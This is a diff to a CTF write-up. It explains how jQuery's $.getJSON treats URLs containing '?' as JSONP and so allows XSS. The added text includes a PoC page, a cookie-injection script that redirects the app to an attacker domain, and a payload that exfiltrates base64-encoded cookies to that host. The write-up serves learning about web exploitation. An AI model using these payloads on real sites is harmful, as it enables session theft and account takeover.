@@ -57,9 +57,9 @@ loaded will do request on `shoebpatel.com/?volga-ctf.ru/user?guid=${guid}` which
 
 4. So this was a ust google search for `$.getJSON XSS` step! We needed to read and find about XSS ways in getJSON !
 
-5. It was damn easy, If the URL to $.getJSON contains `?` anywhere, Examples:
+5. It was damn easy, If the URL to $.getJSON contains `?` anywhere in the following format, Examples:
 	
-	5.0. https://captainfreak.com/q=?
+	5.0. https://captainfreak.com/q?a=?
 	5.a. https://captainfreak.com/??
 	5.b. https://captainfreak.com/=?&
 	5.c. https://captainfreak.com??
@@ -68,10 +68,57 @@ loaded will do request on `shoebpatel.com/?volga-ctf.ru/user?guid=${guid}` which
 It will be considered as JSONP in JQuery's context and by that what it means its basically gonna do 
 
 ```
-<script src="https://captainfreak.com/q=?"></script>
+<script src="https://captainfreak.com/?a=?"></script>
 ```
 
 And this is hostes on volga-ctf.ru. Boom XSS.
+
+If you still need to try yourself to get this:
+
+### PoC:
+
+test.html:
+```
+<!doctype html>
+<html lang="en">
+  <head>
+  	<script src="https://code.jquery.com/jquery-3.4.1.min.js" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"></script>
+
+  </head>
+  <body>
+  	<script type="text/javascript">
+  		$.getJSON('http://0.0.0.0:8000/a?a=?',function(data){});
+  	</script>
+  	
+  </body>
+```
+
+where `http://0.0.0.0:8000/a?a=?` returns just 
+```
+alert(1); 
+```
+
+You will get the alert :) 
+
+### Final Simple XSS Exploit to be uploaded to static domain and reported for SSRF:
+
+```
+<script> 
+document.cookie="api_server=shoebpatel.com\xff; path=/profile.html; domain=.volgactf-task.ru";
+
+// Now we set the server to attacker domain with cookie which will be used for fetching our next XSS cookie exfil payload in below request:
+
+location="https://volgactf-task.ru/profile.html?guid=?"
+
+// This will invoke the $getJSON thingy in main.js with attacker domain responding with second XSS payload :) to send away the cookies on volga-ctf.ru
+</script>
+
+// The request to our attacker server (shoebpatel.com/?volgactf-task.ru/user?guid=?) should host the cookie exfiltration payload like:
+
+const url = "shoebpatel.com/?cookie+" + btoa(document.cookie);
+document.location = url;
+
+```
 
 ### References:
 
